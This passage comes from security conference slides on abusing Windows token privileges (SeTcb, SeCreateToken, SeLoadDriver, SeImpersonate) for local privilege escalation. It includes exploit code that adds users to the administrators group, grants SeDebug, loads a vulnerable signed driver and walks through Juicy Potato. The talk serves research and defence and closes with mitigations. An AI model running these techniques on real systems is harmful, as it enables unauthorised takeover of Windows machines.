➔ “SeImpersonate privilege is not needed for impersonating a thread as long as the 
token is for the same user and the integrity level is less or equal to the current 
process integrity level” (MS added other “constraints” starting from Win 10)
SeTcbPrivilege
“whoami /priv” - Andrea Pierini 
But.. wait… there’s a good news: we can impersonate the thread without 
SeImpersonate privilege bypassing all these checks!
32
SeTcbPrivilege
«S4U Token OriginID==Process Token AuthenticationID»
33
SeTcbPrivilege
 Examples of LsaLogonUser()+S4U  with MSV1_0_S4U_LOGON S4U extension: 
◆ 1. Call LsaLogonUser impersonating our current local user (tcbuser) and add the 
“Local Administrators” group as an extra group into the access token:
●
Impersonate thread with new S4U Token
●
Assign our user (tcbuser) the SeDebug Privilege
◆ 2. Call LsaLogonUser impersonating  “administrator” 
●
Impersonate thread with new S4U Token
●
Put our user (tcbuser) in the Local Administrators group
 Examples of LsaLogonUser()+S4U  with KERB_S4U_LOGON extension
◆ Call LsaLogonUser impersonating a domain admin
●
Write a file in System32 directory
“whoami /priv” - Andrea Pierini 
34
//KERB_S4U_LOGON
//User: PI:EMAIL
using System.Security.Principal;    
public static void NewIdent()
{
WindowsIdentity ident = new WindowsIdentity("PI:EMAIL" );
WindowsImpersonationContext ctx = ident.Impersonate();
try
{
File.WriteAllText("c:\\windows\\system32\\text.txt", "hello from Domain Admin");
}
finally
{
ctx.Undo();
}
}
}
SeTcbPrivilege
“whoami /priv” - Andrea Pierini 
35
“whoami /priv” - Andrea Pierini 
SeTcbPrivilege
Status = LsaLogonUser(
hLsa,
&OriginName,
Network,               
ulAuthenticationPackage,
pS4uLogon,
dwMessageLength,
pGroups,
&TokenSource,          
&pvProfile,
&dwProfile,
&logonId,
&hTokenS4U,
&quotaLimits,
&SubStatus
);
PMSV1_0_S4U_LOGON pS4uLogon;
pS4uLogon->MessageType = MsV1_0S4ULogon; //NTLMSSP local auth
pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, 
szUsername, pbPosition); // "tcbuser", "administrator"
pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, 
pbPosition); // "."
(...)
//S-1-5-32-544 Local Admin Group
bResult = ConvertStringSidToSid("S-1-5-32-544",
&pExtraSid);
pGroups->Groups[pGroups->GroupCount].Attributes =
SE_GROUP_ENABLED |
SE_GROUP_ENABLED_BY_DEFAULT |
SE_GROUP_MANDATORY;
pGroups->Groups[pGroups->GroupCount].Sid =pExtraSid;
(...)
36
“whoami /priv” - Andrea Pierini 
SeTcbPrivilege
DWORD WINAPI  AddPriv(LPVOID lpParam)
{
LSA_UNICODE_STRING lucPrivilege;
NTSTATUS ntsResult;
PSID mysid;
LSA_HANDLE pol;
pol = GetPolicyHandle();
mysid=GetCurrentUserSid();
if (!InitLsaString(&lucPrivilege, 
SE_DEBUG_NAME))
return 0;
ntsResult = LsaAddAccountRights(pol, mysid,
&lucPrivilege, 1);
printf("Added Privilege:%d\n”,
LsaNtStatusToWinError(ntsResult));
return 1;
}
DWORD WINAPI AddUser2AdminGroup(LPVOID lpParam)
{
LOCALGROUP_INFO_1         
localgroup_info;
LOCALGROUP_MEMBERS_INFO_3 
localgroup_members;
LPWSTR lpszUser = L"tcbuser";
localgroup_members.lgrmi3_domainandname =
lpszUser;
int err = NetLocalGroupAddMembers(L".",
L"administrators",
3,
(LPBYTE)&localgroup_members,
1);
printf("Added to administrator groups
result:%d\n", err);
return 0;
}
hThread = CreateThread(NULL,0,AddPriv,NULL,CREATE_SUSPENDED,&threadID); 
SetThreadToken(&hThread, hTokenS4U);
ResumeThread(hThread);
WaitForSingleObject(hThread, 0xFFFFFFFF);
Video
37
➔ Allows a process to create an access token by calling token-creating APIs
➔ With this privilege you can create a custom token with all privileges and group 
membership you need …
➔ You can use the resulting token to impersonate threads even without SeImpersonate
SeCreateToken Privilege
“whoami /priv” - Andrea Pierini 
38
➔ Allows a process to create an access token by calling token-creating APIs
➔ With this privilege you can create a custom token with all privileges and group 
membership you need …
➔ You can use the resulting token to impersonate threads even without SeImpersonate
SeCreateToken Privilege
“whoami /priv” - Andrea Pierini 
But.. wait… we have a problem.. we can no more impersonate  on Win 10 >= 1809 
and Win 2019
39
SeCreateToken Privilege
40
But if you set the AuthenticationId to 
ANONYMOUS_LOGON_UID
(0x3e6) you can always impersonate even in
Win >=1809 and use a subset of API calls:
CreateFile(), RegSetKey()...
SeCreateToken Privilege
41
SeCreateToken Privilege
“whoami /priv” - Andrea Pierini 
NTSATUS ZwCreateToken(
PHANDLE TokenHandle,
ACCESS_MASK DesiredAccess,
POBJECT_ATTRIBUTES ObjectAttributes,
TOKEN_TYPE Type,
PLUID AuthenticationId, 
PLARGE_INTEGER ExpirationTime,
PTOKEN_USER User,
PTOKEN_GROUPS Groups,
PTOKEN_PRIVILEGES Privileges,
PTOKEN_OWNER Owner,
PTOKEN_PRIMARY_GROUP PrimaryGroup,
PTOKEN_DEFAULT_DACL DefaultDacl,
PTOKEN_SOURCE Source
);
42
SeLoadDriver Privilege
“whoami /priv” - Andrea Pierini 
➔ This user right determines which users can dynamically load and unload device 
drivers or other code in to kernel mode
➔ Members of domain group “Printer Operators” have this privilege on the DC
➔ To abuse from this privilege you have to install & load a “vulnerable” signed driver
➔ You have  to “trick” NtLoadDriver() in order to load the driver parameters from an 
alternate location in the registry  (default HKLM\System\...)
➔ Example: Install & Load vulnerable szkg64.sys driver (STOPZilla)
43
SeLoadDriver Privilege
“whoami /priv” - Andrea Pierini 
std::string data = "\\??\\C:\\TEMP\\szkg64.sys";
LSTATUS stat = RegCreateKeyExA(HKEY_CURRENT_USER,
"SYSTEM\\CurrentControlSet\\Services\\Evil",
0,
NULL,
NULL,
KEY_SET_VALUE,
NULL,
&hk,
NULL);
DWORD val=1;
stat = RegSetValueExA(hk, "ImagePath", 
0, REG_EXPAND_SZ, (const BYTE*)data.c_str(),
data.length() + 1);
stat = RegSetValueExA(hk, "Type", 0, 
REG_DWORD, (const BYTE*)&val, sizeof(val));
UNICODE_STRING DriverServiceName;
LPTSTR sidstring;
sidstring=GetCurrentUserSIDStr();
WCHAR regpath1[] = L"\\Registry\\User\\";
WCHAR regpath2[] = 
L"\\System\\CurrentControlSet\\Services\\Evil";
WCHAR winregPath[256];
wcscpy(winregPath, regpath1);
wcscat(winregPath, sidstring);
wcscat(winregPath, regpath2);
RtlInitUnicodeString(&DriverServiceName,
winregPath);
status = NtLoadDriver(&DriverServiceName);
if (!NT_SUCCESS(status)) {
printf("[-] Failed!\n");
return (status);
}
printf("[+] Ok!\n");
44
SeLoadDriver Privilege
“whoami /priv” - Andrea Pierini 
45
SeLoadDriver Privilege
“whoami /priv” - Andrea Pierini 
46
SeImpersonate & SeAssignPrimaryToken Priv.
“whoami /priv” - Andrea Pierini 
➔ These privileges permit to impersonate any access Token
➔ Normally assigned to “Service Users” , Admins and Local System
➔ SeImpersonate:
◆
“Impersonate a client after authentication”
◆
Token can be impersonated by a thread through various API calls  SetThreadToken(), 
ImpersonateLoggedOnUser() …
◆
Token can be impersonated by a process through CreateProcessWithToken()  API call which relies on 
the “Secondary Logon Service”
➔ SeAssignPrimaryToken:
◆
“Assign the primary token of a process”
◆
Token can be impersonated by a process through CreateProcessAsUser() call
◆
Privilege also available in the standard shell (medium IL)
47
SeImpersonate & SeAssignPrimaryToken Priv.
“whoami /priv” - Andrea Pierini 
The danger of Impersonation 
Privileges
48
SeImpersonate & SeAssignPrimaryToken Privs
“whoami /priv” - Andrea Pierini 
➔ How can we obtain privileged tokens to impersonate them?
◆
Creating a  named pipe, forcing a privileged process to write to it and then calling  
ImpersonateNamedPipeClient()  in order to obtain the privileged thread’s token
◆
Establishing a “Security Context” - AcceptSecurityContext() - with a specific SSP (NTLM) in a localhost 
authentication and acquiring a token of the privileged user - QuerySecurityContextToken() –
◆
DCOM/RPC callbacks (CoImpersonateClient(), RpcImpersonateClient())
◆
…
➔ “Rotten Potato” the killer exploit to abuse from these privileges
◆
"Local DCOM DCE/RPC connections can be reflected back to a listening TCP socket allowing access to 
a n NTLM authentication challenge  for LocalSystem user which can be replayed to the local DCOM 
activation service to elevate privileges" - James Forshaw
◆
Exploit & great  POC here: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-
from-service-accounts-to-system/ - Stephen Breen, Chris Mallz
49
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
➔ Rotten Potato and its standalone variants leverages the privilege escalation chain 
based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you 
have SeImpersonate or SeAssignPrimaryToken privileges.
➔ During a Windows Desktop hardening  review my friend Giuseppe found a weak 
service configuration and gained access as “Network Service” but BITS was not 
accessible and port 6666 was firewalled…
➔ So we decided together to weaponize Rotten Potato making:
50
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
➔ Rotten Potato and its standalone variants leverages the privilege escalation chain 
based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you 
have SeImpersonate or SeAssignPrimaryToken privileges.
➔ During a Windows Desktop hardening  review my friend Giuseppe found a weak 
service configuration and gained access as “Network Service” but BITS was not 
accessible and port 6666 was firewalled…
➔ So we decided together to weaponize Rotten Potato making:
51
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
➔ We discovered that, other than BITS there are several out of process COM servers 
identified by specific CLSIDs we can abuse. They need al least to:
◆ be instantiable by the current  “service user”
◆ implement the IMarshal interface
◆ impersonate an elevated user (Local System,…)
➔ Some CLSIDs impersonate the Interactive User in first session 
...interesting if DA is logged in...              
◆
Example CLSID: {BA441419-0B3F-4FB6-A903-D16CC14CCA44} -
CLSID_LockScreenContentionFlyout
52
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
53
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
➔ Juicy Potato allows you to:
◆
Choose a Target CLSID
◆
Define local listening port/ bind address for 
our local COM Endpoint activation service
◆
Define the RPC port and IP address
◆
Program with optional arguments to 
launch if exploitation succeeds
◆
Process Creation Mode  
CreateProcessWithToken() or 
CreateProcessAsUser()
◆
Test mode: upon success prints the token 
User and exits, useful for testing CLSIDs
54
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
➔ Juicy Potato allows you to:
◆
Choose a Target CLSID
◆
Define local listening port/ bind address for 
our local COM Endpoint activation service
◆
Define the RPC port and IP address
◆
Program with optional arguments to 
launch if exploitation succeeds
◆
Process Creation Mode  
CreateProcessWithToken() or 
CreateProcessAsUser()
◆
Test mode: upon success prints the token 
User and exits, useful for testing CLSIDs
★ All you need can be found here: 
https://github.com/decoder-it/juicy-potato
★ Including a list of valid CLSIDs for several Windows 
versions
★ Also available as a metasploit module: 
(exploit/windows/local/ms16_075_reflection_juicy)
55
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
56
From “Rotten Potato” to “Juicy Potato”
“whoami /priv” - Andrea Pierini 
Video
57
Preventing DCOM /NTLM reflection - Rotten / Juicy 
Potato exploit? 
“whoami /priv” - Andrea Pierini 
➔ Disable unnecessary services (xbox game services on Win2016, are you 
kidding me??)
➔ Restrict launch permissions on DCOM objects via DCOMCNFG.EXE (good 
luck)
➔ Disable DCOM (really sure?)
➔ RS5??
58
Preventing DCOM /NTLM reflection - Rotten / Juicy 
Potato exploit?
“whoami /priv” - Andrea Pierini 
➔ Protect sensitive accounts and applications which runs under the *SERVICE* 
accounts
➔ Disable unnecessary services (xbox game services on Win2016, are you 
kidding me??)
➔ Restrict launch permissions on DCOM objects via DCOMCNFG.EXE (good 
luck)
➔ Disable DCOM (really sure?)
59
Preventing DCOM /NTLM reflection - Rotten / Juicy 
Potato exploit?
“whoami /priv” - Andrea Pierini 
➔ Protect sensitive accounts and applications which runs under the *SERVICE* 
accounts
➔ Disable unnecessary services (xbox game services on Win2016, are you 
kidding me??)
➔ Restrict launch permissions on DCOM objects via DCOMCNFG.EXE (good 
luck)
➔ Disable DCOM (really sure?)
Upgrade to Win10 >=1809,  
Windows Server 2019!
https://decoder.cloud/2018/10/29/no-more-rotten-juicy-
potato/
60
Final thoughts
“whoami /priv” - Andrea Pierini 
➔ Never underestimate “whoami /priv” especially in an elevated shell! 
➔ On Windows desktops pre Win10-1809 & WinServer pre 2019, if you have 
SeImpersonate or SeAssignPrimaryToken , “The golden privileges”,  you are 
SYSTEM!
 "Service Users" are more a safety rather than a security feature
➔ Maybe there are other not so well known privileges to abuse from? 
61
whoami /priv – that’s all, thank you!
“whoami /priv” - Andrea Pierini 
62
whoami /priv – that’s all, thank you!
“whoami /priv” - Andrea Pierini 
…hope you enjoyed my talk, did you?